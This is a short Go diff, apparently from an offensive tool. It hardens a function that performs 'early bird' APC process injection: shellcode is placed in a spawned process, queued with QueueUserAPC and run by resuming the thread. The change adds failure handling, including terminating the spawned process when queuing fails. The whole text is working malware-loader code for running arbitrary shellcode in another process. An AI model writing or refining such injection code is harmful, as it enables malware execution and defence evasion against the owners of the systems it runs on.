@@ -67,8 +67,15 @@ func doEarlyBirdInject(targetExe string, sc []byte) error {
 		return fmt.Errorf("allocateRX in spawned process failed: %w", err)
 	}
 
-	procQueueUserAPC.Call(addr, hThread, 0)
-	procResumeThread.Call(hThread)
+	queued, _, _ := procQueueUserAPC.Call(addr, hThread, 0)
+	if queued == 0 {
+		procTerminateProcess.Call(hProc, 1)
+		return fmt.Errorf("QueueUserAPC failed; spawned process terminated")
+	}
+	resumed, _, _ := procResumeThread.Call(hThread)
+	if resumed == ^uintptr(0) {
+		return fmt.Errorf("ResumeThread failed; spawned process left suspended with APC queued")
+	}
 
 	return nil
 }
